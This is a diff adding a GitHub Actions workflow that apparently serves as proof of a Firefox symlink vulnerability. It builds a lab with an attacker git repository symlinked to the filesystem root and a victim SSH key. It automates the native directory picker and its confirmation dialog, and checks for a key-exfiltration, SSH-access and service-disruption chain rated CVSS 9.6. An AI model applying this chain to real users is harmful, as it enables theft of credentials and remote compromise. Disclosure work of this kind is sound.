@@ -1,0 +1,210 @@
+name: Firefox POSIX symlink full impact proof v2
+
+on:
+  push:
+    branches: [runner-probe-20260910]
+    paths:
+      - .github/workflows/firefox-posix-symlink-ssh-e2e-v2.yml
+
+permissions:
+  contents: write
+
+env:
+  LAB_DIR: proof-lab-posix-ssh-20260910
+
+jobs:
+  prove:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: runner-probe-20260910
+
+      - name: Install browser and dependencies
+        id: firefox
+        uses: browser-actions/setup-firefox@v1
+        with:
+          firefox-version: latest
+
+      - name: Install GeckoDriver
+        id: geckodriver
+        uses: browser-actions/setup-geckodriver@latest
+
+      - name: Install lab packages
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openssh-server curl xvfb xdotool
+          python -m pip install --disable-pip-version-check selenium
+
+      - name: Patch runner with native picker fallback
+        run: |
+          python - <<'PY'
+          from pathlib import Path
+          p = Path('proof-lab-posix-ssh-20260910/run_e2e.py')
+          text = p.read_text()
+          text = text.replace('        options.add_argument("-headless")\n', '')
+          old = '''        picker.send_keys(str(SELECTED))
+
+        received_event.wait(60)
+'''
+          new = '''        selection_method = "webdriver-directory-send-keys"
+        try:
+            picker.send_keys(str(SELECTED))
+        except Exception as error:
+            result["webdriver_selection_error"] = repr(error)
+
+        if not received_event.wait(15):
+            selection_method = "native-gtk-picker"
+            driver.get("http://127.0.0.1:8000/index.html")
+            picker = WebDriverWait(driver, 30).until(
+                lambda d: d.find_element(By.ID, "picker")
+            )
+            click_errors = []
+            click_thread = threading.Thread(
+                target=lambda: (
+                    picker.click()
+                    if True else None
+                ),
+                daemon=True,
+            )
+            click_thread.start()
+            time.sleep(3)
+            try:
+                active = subprocess.run(
+                    ["xdotool", "getactivewindow", "getwindowname"],
+                    text=True, capture_output=True, check=False
+                )
+                result["native_picker_active_window"] = active.stdout.strip()
+                subprocess.run(["xdotool", "key", "--clearmodifiers", "ctrl+l"], check=False)
+                time.sleep(0.5)
+                subprocess.run(
+                    ["xdotool", "type", "--clearmodifiers", "--delay", "2", str(SELECTED)],
+                    check=False,
+                )
+                subprocess.run(["xdotool", "key", "--clearmodifiers", "Return"], check=False)
+                time.sleep(2)
+                subprocess.run(["xdotool", "key", "--clearmodifiers", "Return"], check=False)
+            except Exception as error:
+                result["native_picker_automation_error"] = repr(error)
+            click_thread.join(timeout=20)
+            for _ in range(20):
+                try:
+                    alert = driver.switch_to.alert
+                    result["confirmation_text"] = alert.text
+                    alert.accept()
+                    result["confirmation_accepted"] = True
+                    break
+                except Exception:
+                    time.sleep(0.5)
+            received_event.wait(45)
+        result["selection_method"] = selection_method
+'''
+          if old not in text:
+              raise SystemExit('selection patch target not found')
+          p.write_text(text.replace(old, new))
+          PY
+
+      - name: Build isolated lab
+        shell: bash
+        run: |
+          set -euxo pipefail
+          sudo userdel -r labsvc 2>/dev/null || true
+          sudo useradd -m -s /bin/bash labsvc
+          sudo passwd -d labsvc
+          VICTIM_SECRETS=/tmp/firefox-victim-secrets
+          SELECTED="$RUNNER_TEMP/attacker-repository"
+          rm -rf "$VICTIM_SECRETS" "$SELECTED"
+          mkdir -p "$VICTIM_SECRETS" "$SELECTED"
+          ssh-keygen -q -t ed25519 -N '' -f "$VICTIM_SECRETS/id_ed25519"
+          sudo install -d -m 700 -o labsvc -g labsvc /home/labsvc/.ssh
+          sudo install -m 600 -o labsvc -g labsvc "$VICTIM_SECRETS/id_ed25519.pub" /home/labsvc/.ssh/authorized_keys
+          printf %s REMOTE_CONFIDENTIALITY_MARKER_87cd22 | sudo tee /home/labsvc/server-secret.txt >/dev/null
+          printf %s REQUIRED_FOR_SERVICE | sudo tee /home/labsvc/availability-required.flag >/dev/null
+          sudo mkdir -p /home/labsvc/service
+          printf %s SERVICE_HEALTHY | sudo tee /home/labsvc/service/health.txt >/dev/null
+          sudo chown -R labsvc:labsvc /home/labsvc
+          sudo -u labsvc bash -c 'nohup python3 -m http.server 9123 --bind 127.0.0.1 --directory /home/labsvc/service >/home/labsvc/service.log 2>&1 & echo $! >/home/labsvc/service.pid'
+          for i in $(seq 1 30); do curl -fsS http://127.0.0.1:9123/health.txt && break; sleep 0.2; done
+          curl -fsS http://127.0.0.1:9123/health.txt
+          sudo mkdir -p /run/sshd
+          sudo ssh-keygen -A
+          cat > "$RUNNER_TEMP/sshd_config" <<EOF
+          Port 2222
+          ListenAddress 127.0.0.1
+          HostKey /etc/ssh/ssh_host_ed25519_key
+          PidFile $RUNNER_TEMP/sshd.pid
+          AuthorizedKeysFile .ssh/authorized_keys
+          PubkeyAuthentication yes
+          PasswordAuthentication no
+          KbdInteractiveAuthentication no
+          ChallengeResponseAuthentication no
+          UsePAM no
+          PermitRootLogin no
+          AllowUsers labsvc
+          LogLevel VERBOSE
+          Subsystem sftp internal-sftp
+          EOF
+          sed -i 's/^          //' "$RUNNER_TEMP/sshd_config"
+          sudo /usr/sbin/sshd -f "$RUNNER_TEMP/sshd_config" -E "$RUNNER_TEMP/sshd.log"
+          git -C "$SELECTED" init
+          printf %s ATTACKER_REPOSITORY_MARKER > "$SELECTED/README.txt"
+          ln -s / "$SELECTED/root-link"
+          git -C "$SELECTED" add README.txt root-link
+          git -C "$SELECTED" -c user.name=lab -c user.email=lab@example.invalid commit -m 'Attacker repository containing root symlink'
+          git -C "$SELECTED" ls-files -s root-link | grep '^120000 '
+          echo "LAB_SELECTED=$SELECTED" >> "$GITHUB_ENV"
+          echo "LAB_PRIVATE_KEY=$VICTIM_SECRETS/id_ed25519" >> "$GITHUB_ENV"
+          echo "LAB_REMOTE_HOME=/home/labsvc" >> "$GITHUB_ENV"
+          echo "LAB_SERVICE_URL=http://127.0.0.1:9123/health.txt" >> "$GITHUB_ENV"
+
+      - name: Run Firefox through Xvfb
+        env:
+          FIREFOX_BINARY: ${{ steps.firefox.outputs.firefox-path }}
+          GECKODRIVER: ${{ steps.geckodriver.outputs.geckodriver-path }}
+          LANG: C.UTF-8
+        run: |
+          xvfb-run -a -s '-screen 0 1440x1000x24' python "$LAB_DIR/run_e2e.py"
+
+      - name: Publish summary and evidence
+        if: always()
+        run: |
+          mkdir -p .proof-results
+          python - <<'PY'
+          import json
+          from pathlib import Path
+          p=Path('proof-lab-posix-ssh-20260910/result.json')
+          d=json.loads(p.read_text()) if p.exists() else {'verdict':'RUNNER_RESULT_MISSING'}
+          keep=['verdict','cvss_candidate','conditions','browser_capabilities','git_symlink_index','root_link_target','private_key_outside_selected','browser_exfil_sha256','expected_key_sha256','ssh_returncode','service_pre_attack_status','remote_service_post_attack_unavailable','browser_error','webdriver_selection_error','native_picker_active_window','native_picker_automation_error','confirmation_text','confirmation_accepted','selection_method','page_state']
+          s={'workflow_run_id':'${{ github.run_id }}', **{k:d.get(k) for k in keep}}
+          Path('.proof-results/posix-symlink-ssh-summary-v2.json').write_text(json.dumps(s,indent=2,default=str))
+          PY
+          git config user.name github-actions[bot]
+          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
+          git add .proof-results/posix-symlink-ssh-summary-v2.json
+          git commit -m 'Publish Firefox full impact proof v2 result' || true
+          git push origin HEAD:runner-probe-20260910 || true
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: firefox-posix-symlink-ssh-proof-v2
+          path: |
+            proof-lab-posix-ssh-20260910/result.json
+            proof-lab-posix-ssh-20260910/firefox-proof.png
+            ${{ runner.temp }}/sshd.log
+            .proof-results/posix-symlink-ssh-summary-v2.json
+          if-no-files-found: warn
+          retention-days: 1
+
+      - name: Strict 9.6 gate
+        if: always()
+        run: |
+          python - <<'PY'
+          import json
+          d=json.load(open('.proof-results/posix-symlink-ssh-summary-v2.json'))
+          assert d.get('verdict') == 'CONFIRMED_FULL_CIA_CHAIN', json.dumps(d,indent=2)
+          assert d.get('cvss_candidate') == 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H'
+          print('STRICT_9_6_CHAIN_CONFIRMED')
+          PY
